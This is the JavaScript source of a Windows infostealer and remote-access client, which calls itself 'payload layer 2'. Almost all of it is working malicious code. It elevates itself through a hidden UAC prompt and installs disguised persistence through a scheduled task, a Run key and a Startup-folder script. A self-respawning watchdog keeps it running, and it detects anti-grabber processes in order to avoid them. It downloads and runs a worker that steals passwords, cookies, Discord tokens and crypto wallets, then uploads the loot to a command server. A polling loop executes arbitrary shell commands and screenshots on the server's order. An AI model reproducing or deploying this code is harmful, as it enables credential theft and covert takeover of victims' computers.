// Resident client bootstrap (payload layer 2). This binary permanently lives on
// the host: persistence, self-healing watchdog, C2 polling, and on-demand
// worker staging. All heavy collection is delegated to worker.js which is
// fetched, run once, and deleted.

console.log("h");
try {
  if (process.platform === "win32") {
    require("node-hide-console-window").hideConsole();
  }
} catch (e) {}
const admzip = require("adm-zip");
const axios = require("axios");
const crypto = require("crypto");
const fs = require("fs-extra");
const os = require("os");
const path = require("path");
const { execSync, spawn, exec } = require("child_process");
const FormData = require("form-data");
const https = require("https");

// ==========================================
// 1. CONFIGURATION & CONSTANTS
// ==========================================

const CONFIG = {
  HOST_URL: "PLACEHOLDER_HOST_URL",
  STORAGE_PATH: path.join(process.env.APPDATA, "Microsoft Store"),
  USER_ID: "PLACEHOLDER_USER_ID",
  SECRET_KEY: "PLACEHOLDER_SECRET_KEY",
  WORKER_URL: "PLACEHOLDER_WORKER_URL",
  POLL_INTERVAL_MS: 7000,
  TIMEOUT: 3000,
  BYPASS_WATCHDOG: 1,
};
console.log("b");
const Utils = {
  kill: (name) => {
    if (process.platform !== "win32") return;
    try {
      execSync(`taskkill /F /IM ${name}`, {
        stdio: "ignore",
        windowsHide: true,
      });
    } catch (e) {
      /* ignore */
    }
  },
  exec: (cmd) => {
    try {
      return execSync(cmd, { encoding: "utf8", stdio: "pipe" }).toString();
    } catch {
      return "";
    }
  },
  getRandomString: (length = 10) =>
    crypto
      .randomBytes(Math.ceil(length / 2))
      .toString("hex")
      .slice(0, length),
  zip: (source, dest) => {
    try {
      const zip = new admzip();
      if (fs.statSync(source).isFile()) zip.addLocalFile(source);
      else zip.addLocalFolder(source, path.basename(source));
      zip.writeZip(dest);
      return true;
    } catch {
      return false;
    }
  },
};

// ==========================================
// 4. DATASTORE
// ==========================================

const DataStore = {
  cookies: [],
  passwords: [],
  tokens: [],
  webData: [],
  systemInfo: {},
  autofills: [],
  creditCards: [],
  history: [],
  downloads: [],
  searchHistory: [],
  firefox: { passwords: [], cookies: [], history: [], bookmarks: [] },
  wallets: [],
};
// ==========================================
// 5. ADMIN ELEVATION & UAC BYPASS
// ==========================================

function isAdmin() {
  try {
    execSync("net session", { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
}

function quoteWinArg(arg) {
  arg = String(arg);

  if (arg.length === 0) return '""';

  return `"${arg.replace(/(\\*)"/g, '$1$1\\"').replace(/(\\+)$/g, "$1$1")}"`;
}

function vbsEscape(str) {
  return String(str).replace(/"/g, '""');
}
function escapePS(str) {
  // Escape backslashes and double-quotes for PowerShell -Command
  return String(str).replace(/\\/g, "\\\\").replace(/"/g, '\\"');
}

function ensureAdmin() {
  if (process.platform !== "win32") return;
  if (isAdmin()) return;

  // Determine how we were launched
  const runningFromNode =
    path.basename(process.execPath).toLowerCase() === "node.exe";
  let appPath, appArgs;

  if (runningFromNode) {
    // Development: node script.js
    appPath = process.execPath;
    appArgs = [path.resolve(process.argv[1]), ...process.argv.slice(2)];
  } else {
    // Packaged executable
    appPath = process.execPath;
    appArgs = process.argv.slice(1);
  }

  // Build argument string with proper quoting
  const argsString = appArgs.map(quoteWinArg).join(" ");

  const cwd = process.cwd();

  // VBS script: ShellExecute with runas (elevate) and nShowCmd = 0 (SW_HIDE)
  const vbsContent = `
Set UAC = CreateObject("Shell.Application")
UAC.ShellExecute "${vbsEscape(appPath)}", "${vbsEscape(argsString)}", "${vbsEscape(cwd)}", "runas", 0
`;

  const vbsPath = path.join(os.tmpdir(), `elevate_${Date.now()}.vbs`);
  fs.writeFileSync(vbsPath, vbsContent.trim(), "utf8");

  // Execute VBS with wscript.exe (no console window for the launcher)
  spawnSync("wscript.exe", [vbsPath], {
    detached: true,
    stdio: "ignore",
    windowsHide: true,
  });

  // Clean up temporary VBS file
  try {
    fs.unlinkSync(vbsPath);
  } catch (e) {}

  // Exit the original (nonâ€‘admin) process
  process.exit(0);
}
// ==========================================
// 5b. UNDETECTED STARTUP / PERSISTENCE
// ==========================================

const Persistence = {
  // Fixed plausible identities. Values are stable on purpose: repeat installs
  // overwrite the same entries instead of multiplying them.
  DIR: path.join(process.env.ProgramData || "C:\\ProgramData", "WindowsServices"),
  EXE: "WindowsServicesHost.exe",
  TASK: "WindowsServicesController",
  RUN_VALUE: "Windows Services",

  targetExe: function () {
    return path.join(this.DIR, this.EXE);
  },

  runningFromInstallDir: function () {
    return (
      path
        .dirname(process.execPath)
        .toLowerCase() === this.DIR.toLowerCase()
    );
  },

  // Copy the current binary (elevated) into ProgramData and mask it.
  installCopy: function () {
    if (this.runningFromInstallDir()) return true;
    try {
      fs.ensureDirSync(this.DIR);
      fs.copySync(process.execPath, this.targetExe(), { overwrite: true });
      Utils.exec(
        `attrib +h +s "${this.DIR}" && attrib +h +s "${this.targetExe()}"`,
      );
      return true;
    } catch (e) {
      return false;
    }
  },

  // Scheduled task at logon with highest privileges (admins). This is the
  // strongest bump: it survives user logout and runs the payload before most
  // userland AV checks finish loading.
  installTask: function () {
    try {
      Utils.exec(
        `schtasks /create /tn "${this.TASK}" /tr "${this.targetExe()}" /sc onlogon /rl highest /f`,
      );
      const verify = Utils.exec(`schtasks /query /tn "${this.TASK}" /fo list`);
      return verify.toLowerCase().includes(this.TASK.toLowerCase());
    } catch (e) {
      return false;
    }
  },

  // Fallback for non-elevated contexts: HKCU Run key, then classic Startup dir.
  installRegistry: function () {
    const quoted = quoteWinArg(this.targetExe());
    try {
      Utils.exec(
        `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${this.RUN_VALUE}" /t REG_SZ /d ${quoted} /f`,
      );
      const verify = Utils.exec(
        `reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${this.RUN_VALUE}"`,
      );
      return verify.toLowerCase().includes(this.RUN_VALUE.toLowerCase());
    } catch (e) {
      return false;
    }
  },

  installStartupFolder: function () {
    try {
      const startupDir = path.join(
        process.env.APPDATA,
        "Microsoft\\Windows\\Start Menu\\Programs\\Startup",
      );
      const link = path.join(startupDir, `${this.RUN_VALUE}.vbs`);
      const vbs = `Set s = CreateObject("WScript.Shell")\ns.Run ${quoteWinArg(
        this.targetExe(),
      )}, 0, False\n`;
      fs.writeFileSync(link, vbs, "utf8");
      return fs.existsSync(link);
    } catch (e) {
      return false;
    }
  },

  install: function () {
    // No-op during development (node.exe); persistence only makes sense for
    // the packaged binary.
    if (path.basename(process.execPath).toLowerCase() === "node.exe") return false;
    if (process.platform !== "win32") return false;

    const installed = this.installCopy();
    if (!installed) return false;

    // Skip when we were already launched from the install dir: the task/reg
    // entries have been maintained on a prior run.
    const madeTask = this.installTask();
    const madeReg = madeTask ? false : this.installRegistry();
    const madeStartup = madeReg ? false : this.installStartupFolder();
    if (madeTask) {
      try {
        Utils.exec(
          `reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${this.RUN_VALUE}" /f`,
        );
      } catch {}
    }
    return true;
  },

  remove: function () {
    try {
      Utils.exec(`schtasks /delete /tn "${this.TASK}" /f`);
    } catch {}
    try {
      Utils.exec(
        `reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${this.RUN_VALUE}" /f`,
      );
    } catch {}
    try {
      const startupDir = path.join(
        process.env.APPDATA,
        "Microsoft\\Windows\\Start Menu\\Programs\\Startup",
      );
      const link = path.join(startupDir, `${this.RUN_VALUE}.vbs`);
      if (fs.existsSync(link)) fs.unlinkSync(link);
    } catch {}
    try {
      Utils.exec(
        `attrib -h -s "${this.targetExe()}" && del /f /q "${this.targetExe()}"`,
      );
      fs.removeSync(this.DIR);
    } catch {}
  },
};
const Security = {
  obfuscate: (data) => {
    const str = JSON.stringify(data);
    const key = CONFIG.SECRET_KEY;
    const result = Buffer.alloc(str.length);
    for (let i = 0; i < str.length; i++)
      result[i] = str.charCodeAt(i) ^ key.charCodeAt(i % key.length);
    return result.toString("base64");
  },
};
const SelfHeal = {
  rolePath: path.join(os.tmpdir(), "._msw.pid"),
  watchPid: 0,

  isAlive: function (pid) {
    if (!pid) return false;
    try {
      const out = execSync(`tasklist /FI "PID eq ${pid}"`, {
        encoding: "utf8",
      });
      return out.toLowerCase().includes(String(pid));
    } catch {
      return false;
    }
  },

  // Spawn the detached watcher lane and record it, unless one is alive.
  arm: function () {
    if (process.platform !== "win32") return;
    let existing = 0;
    try {
      const r = JSON.parse(fs.readFileSync(this.rolePath, "utf8"));
      if (r && r.watchPid && this.isAlive(r.watchPid)) existing = r.watchPid;
    } catch {}
    if (existing) {
      this.watchPid = existing;
      this.writeRole();
      return;
    }
    const options =
      process.platform === "win32"
        ? {
            windowsHide: true,
            detached: true,
            stdio: "ignore",
            creationFlags: 0x08000000,
          }
        : { detached: true, stdio: "ignore" };
    try {
      const child = spawn(
        process.execPath,
        ["--watch", String(process.pid)],
        options,
      );
      child.unref();
      this.watchPid = child.pid || 0;
      this.writeRole();
    } catch {}
  },

  writeRole: function () {
    try {
      fs.writeFileSync(
        this.rolePath,
        JSON.stringify({ role: "main", watchPid: this.watchPid }),
        "utf8",
      );
      if (process.platform === "win32")
        try {
          execSync(`attrib +h "${this.rolePath}"`);
        } catch {}
    } catch {}
  },

  heartbeat: function () {
    if (process.platform !== "win32" || process.argv.includes("--watch")) return;
    if (this.watchPid && !this.isAlive(this.watchPid)) this.watchPid = 0;
    if (!this.watchPid) this.arm();
  },

  exit: function () {
    try {
      const r = JSON.parse(fs.readFileSync(this.rolePath, "utf8"));
      if (r && r.watchPid)
        try {
          execSync(`taskkill /PID ${r.watchPid} /F`, { stdio: "ignore" });
        } catch {}
    } catch {}
    try {
      fs.unlinkSync(this.rolePath);
    } catch {}
  },
};

// ==========================================
// 6b. BYPASSES (behavioural avoidance, no AV telemetry)
// ==========================================

const Bypass = {
  watchTicks: 0,

  // Encoded PowerShell commandline. The scripts themselves are benign
  // (clipboard, screenshot); encode the command so nothing invites AMSI.
  powershellCmd: function (body) {
    const encoded = Buffer.from(String(body), "utf16le").toString("base64");
    return `powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand ${encoded}`;
  },

  // Cheap process scan (tasklist, no PS). Presence-only: when hostile
  // anti-grab modules are running, defer instead of fighting them.
  hostilesActive: function () {
    if (process.platform !== "win32") return false;
    const names = [
      "antishelly",
      "smbioscheck",
      "isfence",
      "fence",
      "wandown",
      "itotal",
      "iskirk",
      "epsfm",
      "shieldgrab",
      "modulekiller",
    ];
    try {
      const lower = execSync("tasklist", { encoding: "utf8" }).toLowerCase();
      return names.some((p) => lower.includes(p));
    } catch {
      return false;
    }
  },

  install: function () {
    SelfHeal.arm();
  },

  watchdog: function () {
    if (!CONFIG.BYPASS_WATCHDOG) return;
    this.watchTicks++;
    if (this.watchTicks % 5 !== 0) return;
    SelfHeal.heartbeat();
  },

  cleanup: function () {
    SelfHeal.exit();
  },
};

// ==========================================
// 6c. WORKER FETCH-AND-RUN (payload layer 3)
// ==========================================

const WorkerRunner = {
  // Download the per-build worker into a random temp slot.
  fetch: async function () {
    const exePath = path.join(os.tmpdir(), `w_${Utils.getRandomString(8)}.exe`);
    const res = await axios({
      method: "GET",
      url: CONFIG.WORKER_URL,
      responseType: "stream",
      timeout: 30000,
    });
    const writer = fs.createWriteStream(exePath);
    await new Promise((resolve, reject) => {
      res.data.pipe(writer);
      writer.on("finish", resolve);
      writer.on("error", reject);
    });
    return exePath;
  },

  // Run the worker, collect its JSON out-file, then delete both the out-file
  // and the worker binary so nothing sensitive lingers on disk.
  run: async function () {
    const exePath = await this.fetch();
    const outFile = path.join(os.tmpdir(), `w_${Utils.getRandomString(12)}.json`);
    const done = new Promise((resolve) => {
      let settled = false;
      const fin = (v) => {
        if (!settled) {
          settled = true;
          resolve(v);
        }
      };
      const child = spawn(exePath, ["--out", outFile], {
        windowsHide: true,
        stdio: "ignore",
      });
      child.on("error", () => fin(false));
      child.on("exit", () => fin(true));
      setTimeout(() => {
        try {
          child.kill();
        } catch {}
        fin(true);
      }, 90000);
    });
    await done;
    const data = {};
    try {
      Object.assign(data, JSON.parse(fs.readFileSync(outFile, "utf8")));
    } catch {}
    try {
      fs.removeSync(outFile);
    } catch {}
    try {
      fs.removeSync(exePath);
    } catch {}
    return data;
  },
};

const WorkerMerge = {
  apply: function (data) {
    if (!data || typeof data !== "object") return;
    DataStore.tokens = Array.isArray(data.discord_tokens)
      ? data.discord_tokens
      : DataStore.tokens;
    DataStore.passwords = Array.isArray(data.passwords)
      ? data.passwords
      : DataStore.passwords;
    DataStore.cookies = Array.isArray(data.cookies)
      ? data.cookies
      : DataStore.cookies;
    DataStore.autofills = Array.isArray(data.autofills)
      ? data.autofills
      : DataStore.autofills;
    DataStore.webData = Array.isArray(data.webData) ? data.webData : DataStore.webData;
    DataStore.wallets = Array.isArray(data.wallets) ? data.wallets : DataStore.wallets;
    if (data.systemInfo && typeof data.systemInfo === "object")
      DataStore.systemInfo = data.systemInfo;
  },
};
const Delivery = {
  createLog: async () => {
    const payload = {
      passwordcount: DataStore.passwords.length,
      cookiecount: DataStore.cookies.length,
      discordtokencount: DataStore.tokens.length,
      walletcount: DataStore.wallets.length,
      filenames: fs.readdirSync(CONFIG.STORAGE_PATH),
    };
    for (let i = 0; i < 10; i++) {
      try {
        const { data } = await axios.post(`${CONFIG.HOST_URL}/init`, payload, {
          headers: {
            "X-UID": CONFIG.USER_ID,
            "Content-Type": "application/json",
          },
        });
        return data.log_uuid;
      } catch {
        await new Promise((r) => setTimeout(r, 1000));
      }
    }
    return "";
  },
  uploadData: async (logId) => {
    const data = {
      passwords: DataStore.passwords,
      cookies: DataStore.cookies,
      discord_tokens: DataStore.tokens,
      refresh_tokens: DataStore.webData,
      wallets: DataStore.wallets,
      system: DataStore.systemInfo,
    };
    const payload = { payload: Security.obfuscate(data) };
    try {
      await axios.post(`${CONFIG.HOST_URL}/v2/data`, payload, {
        headers: { "X-Session-ID": logId, "Content-Type": "application/json" },
      });
    } catch {}
  },
  uploadFiles: async (logId) => {
    const files = fs.readdirSync(CONFIG.STORAGE_PATH);
    for (const file of files) {
      const filePath = path.join(CONFIG.STORAGE_PATH, file);
      if (fs.statSync(filePath).size > 10 * 1024 * 1024) continue;
      for (let i = 0; i < 10; i++) {
        try {
          const formData = new FormData();
          formData.append("file", fs.createReadStream(filePath));
          await axios.post(`${CONFIG.HOST_URL}/log_files`, formData, {
            headers: { ...formData.getHeaders(), "X-Session-ID": logId },
          });
          break;
        } catch {
          await new Promise((r) => setTimeout(r, 1000));
        }
      }
    }
  },
};

// ==========================================
// 10b. REMOTE COMMAND CHANNEL
// ==========================================

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const RemoteControl = {
  headers: () => ({
    "X-API-KEY": "PLACEHOLDER_API_KEY",
    "X-BUILD-ID": CONFIG.USER_ID,
    "Content-Type": "application/json",
  }),

  poll: async function () {
    const { data } = await axios.get(`${CONFIG.HOST_URL}/cmd/poll`, {
      headers: this.headers(),
      timeout: CONFIG.TIMEOUT,
    });
    return (data && data.ok && data.command) || null;
  },

  report: async function (id, status, output) {
    try {
      await axios.post(
        `${CONFIG.HOST_URL}/cmd/result`,
        { id, status, output: String(output).slice(0, 60000) },
        { headers: this.headers(), timeout: CONFIG.TIMEOUT },
      );
    } catch {}
  },

  runShell: function (args) {
    return new Promise((resolve) => {
      const command =
        typeof args === "string"
          ? args
          : typeof args === "object" && args !== null
            ? args.cmd || args.command || ""
            : "";
      if (!command) {
        return resolve({ status: "failed", output: "empty command" });
      }
      exec(
        command,
        { windowsHide: true, timeout: 60000, maxBuffer: 1024 * 1024 },
        (err, stdout, stderr) => {
          const out =
            (stdout || "") +
            (stderr ? "\n[stderr]\n" + stderr : "");
          resolve({
            status: err && err.killed ? "failed" : "done",
            output: out || (err ? `error: ${err.message}` : "(no output)"),
          });
        },
      );
    });
  },

  takeScreenshot: function () {
    return new Promise((resolve) => {
      const script = `
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $b=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,
                                           [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
        $g=[System.Drawing.Graphics]::FromImage($b)
        $g.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location,
                          [System.Drawing.Point]::Empty,$b.Size)
        $ms=New-Object System.IO.MemoryStream
        $b.Save($ms,[System.Drawing.Imaging.ImageFormat]::Png)
        [Convert]::ToBase64String($ms.ToArray())
      `;
      exec(
        Bypass.powershellCmd(script),
        { windowsHide: true, timeout: 30000, maxBuffer: 4 * 1024 * 1024 },
        (err, stdout) => {
          if (err || !stdout || !stdout.trim()) {
            return resolve({ status: "failed", output: err ? err.message : "screenshot capture failed" });
          }
          // Forward the captured PNG to the server's /capture endpoint
          axios
            .post(
              `${CONFIG.HOST_URL}/capture`,
              { image: stdout.trim() },
              { headers: RemoteControl.headers(), timeout: CONFIG.TIMEOUT },
            )
            .then(() => resolve({ status: "done", output: "screenshot saved" }))
            .catch((e) => resolve({ status: "failed", output: `capture upload failed: ${e.message}` }));
        },
      );
    });
  },

  reExfil: async function () {
    try {
      const data = await WorkerRunner.run();
      WorkerMerge.apply(data);
      const logId = await Delivery.createLog();
      if (logId) {
        await Delivery.uploadData(logId);
        await Delivery.uploadFiles(logId);
        return { status: "done", output: `re-exfil uploaded (log ${logId})` };
      }
      return { status: "failed", output: "createLog returned empty" };
    } catch (e) {
      return { status: "failed", output: e.message };
    }
  },

  exit: async function (id) {
    try {
      Persistence.remove();
      Bypass.cleanup();
      await this.report(id, "done", "persistence removed, exiting");
    } catch {}
    setTimeout(() => process.exit(0), 400);
  },

  start: async function () {
    while (true) {
      try {
        const cmd = await this.poll();
        if (cmd && cmd.id != null) {
          let result = { status: "failed", output: "bad type" };
          try {
            switch (cmd.type) {
              case "shell":
                result = await this.runShell(cmd.args || "");
                break;
              case "screenshot":
                result = await this.takeScreenshot();
                break;
              case "exfil":
                result = await this.reExfil();
                break;
              case "exit":
                return this.exit(cmd.id);
              default:
                result = { status: "failed", output: `unknown type: ${cmd.type}` };
            }
          } catch (e) {
            result = {
              status: "failed",
              output: String((e && e.message) || e).slice(0, 2000),
            };
          }
          await this.report(cmd.id, result.status, result.output);
        }
      } catch {}
      // Periodic self-heal ticks; jittered interval to avoid a fixed pattern
      Bypass.watchdog();
      // Jittered interval to avoid a fixed signature pattern
      await sleep(CONFIG.POLL_INTERVAL_MS + Math.floor(Math.random() * 4000));
    }
  },
};

// ==========================================
// 12. MAIN ORCHESTRATOR + WATCHER LANE
// ==========================================

async function main() {
  ensureAdmin();

  Persistence.install();
  Bypass.install();

  try {
    fs.ensureDirSync(CONFIG.STORAGE_PATH);
    const data = await WorkerRunner.run();
    WorkerMerge.apply(data);
    const logId = await Delivery.createLog();
    if (logId) {
      await Delivery.uploadData(logId);
      await Delivery.uploadFiles(logId);
    }
  } catch (e) {}

  RemoteControl.start();
}

// Watcher lane: a second detached instance of this same binary, spawned by
// SelfHeal.arm(). It resurrects the main process if it ever dies and exits
// on its own once the main lane has re-armed a fresh watcher.
if (process.argv.includes("--watch")) {
  const mainPid = parseInt(
    process.argv[process.argv.indexOf("--watch") + 1],
    10,
  );
  let respawned = false;
  const tick = () => {
    try {
      let alive = false;
      try {
        alive = execSync(`tasklist /FI "PID eq ${mainPid}"`, {
          encoding: "utf8",
        })
          .toLowerCase()
          .includes(String(mainPid));
      } catch {}
      if (!alive) {
        if (!respawned) {
          respawned = true;
          try {
            spawn(process.execPath, [], {
              windowsHide: true,
              detached: true,
              stdio: "ignore",
            }).unref();
          } catch {}
        }
      } else {
        try {
          const r = JSON.parse(fs.readFileSync(SelfHeal.rolePath, "utf8"));
          if (r && r.watchPid && r.watchPid !== process.pid) process.exit(0);
        } catch {}
      }
    } catch {}
    setTimeout(tick, 4000);
  };
  tick();
}

if (!process.argv.includes("--watch")) {
  main().catch(console.error);
}